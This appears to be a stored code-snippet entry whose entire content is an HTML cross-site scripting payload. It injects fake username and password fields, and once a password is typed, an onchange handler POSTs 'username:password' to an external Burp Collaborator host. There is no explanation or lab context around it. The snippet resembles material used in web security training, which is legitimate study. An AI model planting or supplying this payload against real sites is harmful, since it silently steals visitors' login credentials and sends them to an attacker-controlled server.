---
id: 902f6e5e-3992-459b-aaef-d704c7fa1470
type: code
language: ''
verified: false
created_at: '2020-08-05T18:13:46.426043+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 902f6e5e

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://$.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```


